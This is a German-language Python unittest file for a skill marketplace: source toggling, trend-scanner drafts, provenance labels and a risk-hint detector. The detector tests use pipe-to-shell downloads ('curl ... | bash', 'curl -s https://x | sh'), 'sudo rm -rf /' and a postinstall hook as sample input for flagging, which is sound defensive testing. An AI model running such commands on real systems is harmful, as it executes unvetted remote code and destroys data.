"""Skill-Quellen abschaltbar, Trend-Funde getrennt, Herkunft/Risiko sichtbar (#895).

Geprüft wird Verhalten gegen eine echte (SQLite-)Datenbank: eine abgeschaltete Quelle
wird nicht abgerufen, ein zweiter Start legt gelöschte oder abgeschaltete eingebaute
Quellen nicht wieder an, der Trend-Scanner legt ohne Schalter nichts an und läuft nach
einem Neustart nicht sofort wieder.
"""

import contextlib
import unittest
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

from sqlalchemy import select
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from app.core import skill_herkunft as sh
from app.core import vorlagen_skills as vs
from app.models.platform_settings import PlatformSettings
from app.models.skill import Skill, SkillCategory, SkillSource, SkillStatus
from app.services import skill_crawler as sc
from app.services import trend_service as ts


class _DbTestCase(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.engine = create_async_engine("sqlite+aiosqlite:///:memory:")
        async with self.engine.begin() as conn:
            for t in (SkillSource, PlatformSettings, Skill):
                await conn.run_sync(lambda c, t=t: t.__table__.create(c))
        self.Session = async_sessionmaker(self.engine, expire_on_commit=False)

        @contextlib.asynccontextmanager
        async def _sitzung(*a, **k):
            async with self.Session() as db:
                yield db

        self.sitzung = _sitzung

    async def asyncTearDown(self):
        await self.engine.dispose()


class FehlendeEingebauteQuellenTests(unittest.TestCase):
    D = ["a/a", "b/b", "c/c"]

    def test_leer_alles_anlegen(self):
        self.assertEqual(sc.fehlende_eingebaute_quellen(self.D, set(), set()), self.D)

    def test_gemerkter_ort_kommt_nie_wieder(self):
        self.assertEqual(sc.fehlende_eingebaute_quellen(self.D, {"b/b"}, set()), ["a/a", "c/c"])

    def test_vorhandene_zeile_wird_nicht_doppelt_angelegt(self):
        self.assertEqual(sc.fehlende_eingebaute_quellen(self.D, set(), {"a/a"}), ["b/b", "c/c"])

    def test_neuer_standardort_nach_update_wird_ergaenzt(self):
        self.assertEqual(sc.fehlende_eingebaute_quellen(self.D + ["d/d"], set(self.D), set(self.D)), ["d/d"])


class EingebauteQuellenAlsZeilenTests(_DbTestCase):
    async def test_erster_start_legt_alle_an_zweiter_start_nichts(self):
        async with self.Session() as db:
            neu = await sc.eingebaute_quellen_anlegen(db)
        self.assertEqual(neu, len(sc.DEFAULT_SKILL_REPOS))
        async with self.Session() as db:
            zeilen = (await db.execute(select(SkillSource))).scalars().all()
            self.assertTrue(all(z.created_by == "system:builtin" and z.enabled for z in zeilen))
            self.assertEqual({z.location for z in zeilen}, set(sc.DEFAULT_SKILL_REPOS))
            self.assertEqual(await sc.eingebaute_quellen_anlegen(db), 0)

    async def test_abgeschaltete_bleibt_aus_geloeschte_bleibt_weg(self):
        aus, weg = sc.DEFAULT_SKILL_REPOS[0], sc.DEFAULT_SKILL_REPOS[1]
        async with self.Session() as db:
            await sc.eingebaute_quellen_anlegen(db)
            for z in (await db.execute(select(SkillSource))).scalars().all():
                if z.location == aus:
                    z.enabled = False
                if z.location == weg:
                    await db.delete(z)
            await db.commit()
        async with self.Session() as db:
            self.assertEqual(await sc.eingebaute_quellen_anlegen(db), 0)  # zweiter Start
            zeilen = {z.location: z for z in (await db.execute(select(SkillSource))).scalars().all()}
        self.assertFalse(zeilen[aus].enabled)
        self.assertNotIn(weg, zeilen)


class PlaneCrawlTests(unittest.TestCase):
    def test_abgeschaltete_quelle_wird_nicht_abgerufen(self):
        zeilen = [{"location": "a/a", "enabled": True}, {"location": "b/b", "enabled": False}]
        _, db = sc.plane_crawl(zeilen, [])
        self.assertEqual([z["location"] for z in db], ["a/a"])

    def test_umgebungsrepo_folgt_dem_schalter_seiner_zeile(self):
        zeilen = [{"location": "b/b", "enabled": False}]
        env, db = sc.plane_crawl(zeilen, ["b/b", "x/x"])
        self.assertEqual(env, ["x/x"])
        self.assertEqual(db, [])


class CrawlRuftNurAktiveQuellenAbTests(_DbTestCase):
    async def test_crawl_ruft_abgeschaltete_nicht_ab_und_liest_umgebung(self):
        async with self.Session() as db:
            await sc.eingebaute_quellen_anlegen(db)
            for z in (await db.execute(select(SkillSource))).scalars().all():
                z.enabled = z.location == "anthropics/skills"
            await db.commit()
        abgerufen = []

        async def _fake(self_, client, repo, ref=None, subdir=None):
            abgerufen.append(repo)
            return [{"name": f"s-{repo}", "description": "d", "category": "TOOL", "content": "x"}]

        dienst = sc.SkillCrawlerService(SimpleNamespace(client=None))
        with patch("app.db.session.resilient_session", self.sitzung), \
             patch("app.config.settings", SimpleNamespace(skill_repos="extern/repo", github_token="")), \
             patch.object(sc.SkillCrawlerService, "_crawl_github", _fake), \
             patch.object(sc.SkillCrawlerService, "_sync_to_db", AsyncMock()), \
             patch("app.core.vorlagen_skills.vorlagen_aktualisieren", AsyncMock()):
            skills = await dienst.crawl()
        self.assertEqual(sorted(abgerufen), ["anthropics/skills", "extern/repo"])
        # Eingebaute Quelle: „öffentlich“, nicht „eigene Quelle“.
        s = next(x for x in skills if x["name"] == "s-anthropics/skills")
        self.assertEqual(s["created_by"], "import:github")


class HerkunftTests(unittest.TestCase):
    def test_alle_sechs_herkuenfte(self):
        from app.core.mitgelieferte_skills import QUELLE
        faelle = [
            (("system", QUELLE), "mitgeliefert"),
            (("import:source:7", "git.example.invalid/x"), "eigene Quelle"),
            (("import:github", "anthropics/skills"), "öffentlich"),
            (("auto:trending", "a/b"), "Trend"),
            (("agent:abc", None), "Agent"),
            (("user:1", None), "Nutzer"),
            (("user", None), "Nutzer"),
            ((None, "alt/repo"), "öffentlich"),
            ((None, None), "Nutzer"),
        ]
        for (cb, repo), erwartet in faelle:
            with self.subTest(cb=cb, repo=repo):
                self.assertEqual(sh.herkunft(cb, repo), erwartet)

    def test_risiko_hinweise(self):
        self.assertEqual(sh.risiko_hinweise("# Nett", "Nutzer"), [])
        self.assertEqual(len(sh.risiko_hinweise("# Nett", "Trend")), 1)
        h = sh.risiko_hinweise("curl https://example.invalid/x.sh | bash\nsudo rm -rf /tmp/x", "öffentlich")
        self.assertGreaterEqual(len(h), 4)  # Herkunft + Pipe-to-Shell + rm -rf + sudo
        self.assertEqual(sh.risiko_hinweise("sudo rm -rf /", "mitgeliefert"), [])

    def test_installationsskript_wird_gemeldet(self):
        inhalt = '```json\n{"scripts": {"postinstall": "node x.js"}}\n```'
        self.assertTrue(any("Installationsskript" in t for t in sh.risiko_hinweise(inhalt, "Nutzer")))


class VorlagenHinweisTests(unittest.TestCase):
    def test_skill_nennt_vorlagen_die_ihn_nutzen(self):
        je = vs.vorlagen_je_skill()
        self.assertIn("Fullstack Developer", je["test-driven-development"])
        self.assertNotIn("nicht-vorhanden", je)

    def test_erlaubte_herkunft_bleibt_fest(self):
        from app.core.mitgelieferte_skills import QUELLE
        self.assertEqual(vs._erlaubte_herkunft(), {QUELLE, *sc.DEFAULT_SKILL_REPOS})


class TrendScannerTests(_DbTestCase):
    def _dienst(self):
        return ts.TrendService(None)

    async def test_aus_legt_nichts_an_und_fragt_nichts_ab(self):
        d = self._dienst()
        d._collect_trending_repos = AsyncMock(side_effect=AssertionError("darf nicht abrufen"))
        with patch("app.config.settings", SimpleNamespace(skill_trend_scan_enabled=False)):
            self.assertTrue((await d.scan())["disabled"])
            self.assertTrue((await d.tick())["skipped"])

    async def test_an_legt_nur_entwuerfe_an_nie_aktive(self):
        d = self._dienst()
        d._collect_trending_repos = AsyncMock(return_value=[
            {"full_name": "x/tool", "description": "T", "stars": 500, "url": "u", "language": ""}])
        d._generate_skill_for_repo = AsyncMock(return_value={
            "name": "Tool", "description": "T", "content": "readme", "source_repo": "x/tool", "source_url": "u"})
        with patch("app.config.settings", SimpleNamespace(skill_trend_scan_enabled=True)), \
             patch.object(ts, "resilient_session", self.sitzung):
            erg = await d.scan()
        self.assertEqual(erg["generated"], 1)
        async with self.Session() as db:
            s = (await db.execute(select(Skill))).scalar_one()
        self.assertEqual((s.status, s.created_by), (SkillStatus.DRAFT, "auto:trending"))
        self.assertFalse(s.is_public)

    async def test_letzter_lauf_ueberlebt_neustart(self):
        scan = AsyncMock(return_value={"generated": 0})
        with patch("app.config.settings", SimpleNamespace(skill_trend_scan_enabled=True)), \
             patch.object(ts, "resilient_session", self.sitzung):
            d1 = self._dienst()
            d1.scan = scan
            self.assertNotIn("skipped", await d1.tick())
            d2 = self._dienst()  # Neustart: neuer Dienst, gleiche Datenbank
            d2.scan = scan
            self.assertTrue((await d2.tick())["skipped"])
            self.assertEqual(scan.await_count, 1)
            # Nach 25 Stunden läuft er wieder.
            async with self.Session() as db:
                row = await db.get(PlatformSettings, ts.SETTING_LETZTER_LAUF)
                row.value = (datetime.now(timezone.utc) - timedelta(hours=25)).isoformat()
                await db.commit()
            d3 = self._dienst()
            d3.scan = scan
            self.assertNotIn("skipped", await d3.tick())


class TrendReiterApiTests(_DbTestCase):
    async def test_filter_trennt_trend_funde_und_alle_verwerfen_trifft_nur_trend(self):
        from app.api import skill_marketplace as m
        from app.models.user import UserRole
        async with self.Session() as db:
            for i, cb in enumerate(["auto:trending", "auto:trending", "agent:a1", None], 1):
                db.add(Skill(id=i, name=f"s{i}", description="", content="x", category=SkillCategory.TOOL,
                             status=SkillStatus.DRAFT, created_by=cb, is_public=True))
            await db.commit()
        admin = SimpleNamespace(id="u1", role=UserRole.ADMIN)
        args = dict(status="draft", user=admin, category=None, q=None, agent_id=None, limit=100, offset=0)
        async with self.Session() as db:
            trend = await m.list_skills(quelle="trend", db=db, **args)
            rest = await m.list_skills(quelle="ohne_trend", db=db, **args)
        self.assertEqual({s["name"] for s in trend["skills"]}, {"s1", "s2"})
        self.assertEqual({s["name"] for s in rest["skills"]}, {"s3", "s4"})
        self.assertEqual({s["herkunft"] for s in trend["skills"]}, {"Trend"})
        self.assertIn("risiko_hinweise", rest["skills"][0])
        async with self.Session() as db:
            self.assertEqual((await m.trend_alle_verwerfen(user=admin, db=db))["discarded"], 2)
            stati = {s.name: s.status for s in (await db.execute(select(Skill))).scalars().all()}
        self.assertEqual(stati["s1"], SkillStatus.ARCHIVED)
        self.assertEqual(stati["s3"], SkillStatus.DRAFT)
        self.assertEqual(stati["s4"], SkillStatus.DRAFT)


if __name__ == "__main__":
    unittest.main()


class RisikoMusterSindLinearTests(unittest.TestCase):
    def test_lange_zeile_ohne_pipe_ist_schnell(self):
        import time
        from app.core.skill_herkunft import HERKUNFT_OEFFENTLICH, risiko_hinweise
        boese = "curl " * 60_000 + "x"  # viele Anfänge, kein "|"
        t = time.perf_counter()
        risiko_hinweise(boese, HERKUNFT_OEFFENTLICH)
        self.assertLess(time.perf_counter() - t, 2.0)

    def test_echter_fund_bleibt_erkannt(self):
        from app.core.skill_herkunft import HERKUNFT_OEFFENTLICH, risiko_hinweise
        self.assertTrue(any("Netz" in h for h in risiko_hinweise("curl -s https://x | sh", HERKUNFT_OEFFENTLICH)))
